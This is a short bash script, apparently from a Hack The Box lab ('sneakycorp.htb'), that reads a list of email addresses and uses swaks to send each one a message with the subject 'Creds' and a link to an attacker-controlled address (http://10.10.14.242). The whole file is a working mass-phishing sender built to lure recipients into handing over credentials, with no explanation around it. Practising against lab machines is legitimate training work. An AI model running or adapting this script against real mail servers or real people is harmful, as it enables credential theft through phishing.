#!/bin/bash

me=waza@waza.com
for email in $(cat mails) 
do
    swaks -s smtp.sneakycorp.htb --to $email --from $me --header "Subject: Creds" --body "goto http://10.10.14.242" &

done